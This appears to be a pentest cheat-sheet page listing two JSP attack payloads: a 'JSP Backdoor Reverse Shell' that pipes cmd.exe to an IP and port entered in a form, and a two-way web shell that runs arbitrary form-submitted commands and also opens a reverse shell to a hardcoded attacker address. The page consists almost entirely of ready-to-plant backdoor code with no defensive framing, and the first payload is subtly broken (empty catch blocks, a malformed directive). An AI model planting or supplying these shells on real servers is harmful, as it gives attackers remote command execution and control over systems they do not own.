# JSP

### 1) Reverse shell payload

    <%@
    page import="java.lang.*, java.util.*, java.io.*, java.net.*"
    % >
    <%!
    static class StreamConnector extends Thread
    {
            InputStream is;
            OutputStream os;
    
            StreamConnector(InputStream is, OutputStream os)
            {
                    this.is = is;
                    this.os = os;
            }
    
            public void run()
            {
                    BufferedReader isr = null;
                    BufferedWriter osw = null;
    
                    try
                    {
                            isr = new BufferedReader(new InputStreamReader(is));
                            osw = new BufferedWriter(new OutputStreamWriter(os));
    
                            char buffer[] = new char[8192];
                            int lenRead;
    
                            while( (lenRead = isr.read(buffer, 0, buffer.length)) > 0)
                            {
                                    osw.write(buffer, 0, lenRead);
                                    osw.flush();
                            }
                    }
                    catch (Exception ioe)
    
                    try
                    {
                            if(isr != null) isr.close();
                            if(osw != null) osw.close();
                    }
                    catch (Exception ioe)
            }
    }
    %>
    
    <h1>JSP Backdoor Reverse Shell</h1>
    
    <form method="post">
    IP Address
    <input type="text" name="ipaddress" size=30>
    Port
    <input type="text" name="port" size=10>
    <input type="submit" name="Connect" value="Connect">
    </form>
    <p>
    <hr>
    
    <%
    String ipAddress = request.getParameter("ipaddress");
    String ipPort = request.getParameter("port");
    
    if(ipAddress != null && ipPort != null)
    {
            Socket sock = null;
            try
            {
                    sock = new Socket(ipAddress, (new Integer(ipPort)).intValue());
    
                    Runtime rt = Runtime.getRuntime();
                    Process proc = rt.exec("cmd.exe");
    
                    StreamConnector outputConnector =
                            new StreamConnector(proc.getInputStream(),
                                              sock.getOutputStream());
    
                    StreamConnector inputConnector =
                            new StreamConnector(sock.getInputStream(),
                                              proc.getOutputStream());
    
                    outputConnector.start();
                    inputConnector.start();
            }
            catch(Exception e) 
    }
    %>

### 2) RCE payload

    <%
        /*
         * Usage: This is a 2 way shell, one web shell and a reverse shell. First, it will try to connect to a listener (atacker machine), with the IP and Port specified at the end of the file.
         * If it cannot connect, an HTML will prompt and you can input commands (sh/cmd) there and it will prompts the output in the HTML.
         * Note that this last functionality is slow, so the first one (reverse shell) is recommended. Each time the button "send" is clicked, it will try to connect to the reverse shell again (apart from executing 
         * the command specified in the HTML form). This is to avoid to keep it simple.
         */
    %>
    
    <%@page import="java.lang.*"%>
    <%@page import="java.io.*"%>
    <%@page import="java.net.*"%>
    <%@page import="java.util.*"%>
    
    <html>
    <head>
        <title>jrshell</title>
    </head>
    <body>
    <form METHOD="POST" NAME="myform" ACTION="">
        <input TYPE="text" NAME="shell">
        <input TYPE="submit" VALUE="Send">
    </form>
    <pre>
    <%
    
        // Define the OS
        String shellPath = null;
        try
        {
            if (System.getProperty("os.name").toLowerCase().indexOf("windows") == -1) {
                shellPath = new String("/bin/sh");
            } else {
                shellPath = new String("cmd.exe");
            }
        } catch( Exception e ){}
    
    
        // INNER HTML PART
        if (request.getParameter("shell") != null) {
            out.println("Command: " + request.getParameter("shell") + "\n<BR>");
            Process p;
    
            if (shellPath.equals("cmd.exe"))
                p = Runtime.getRuntime().exec("cmd.exe /c " + request.getParameter("shell"));
            else
                p = Runtime.getRuntime().exec("/bin/sh -c " + request.getParameter("shell"));
    
            OutputStream os = p.getOutputStream();
            InputStream in = p.getInputStream();
            DataInputStream dis = new DataInputStream(in);
            String disr = dis.readLine();
            while ( disr != null ) {
                out.println(disr);
                disr = dis.readLine();
            }
        }
    
        // TCP PORT PART
        class StreamConnector extends Thread
        {
            InputStream wz;
            OutputStream yr;
    
            StreamConnector( InputStream wz, OutputStream yr ) {
                this.wz = wz;
                this.yr = yr;
            }
    
            public void run()
            {
                BufferedReader r  = null;
                BufferedWriter w = null;
                try
                {
                    r  = new BufferedReader(new InputStreamReader(wz));
                    w = new BufferedWriter(new OutputStreamWriter(yr));
                    char buffer[] = new char[8192];
                    int length;
                    while( ( length = r.read( buffer, 0, buffer.length ) ) > 0 )
                    {
                        w.write( buffer, 0, length );
                        w.flush();
                    }
                } catch( Exception e ){}
                try
                {
                    if( r != null )
                        r.close();
                    if( w != null )
                        w.close();
                } catch( Exception e ){}
            }
        }
     
        try {
            Socket socket = new Socket( "192.168.119.128", 8081 ); // Replace with wanted ip and port
            Process process = Runtime.getRuntime().exec( shellPath );
            new StreamConnector(process.getInputStream(), socket.getOutputStream()).start();
            new StreamConnector(socket.getInputStream(), process.getOutputStream()).start();
            out.println("port opened on " + socket);
         } catch( Exception e ) {}
    
    
    %>
    </pre>
    </body>
    </html>
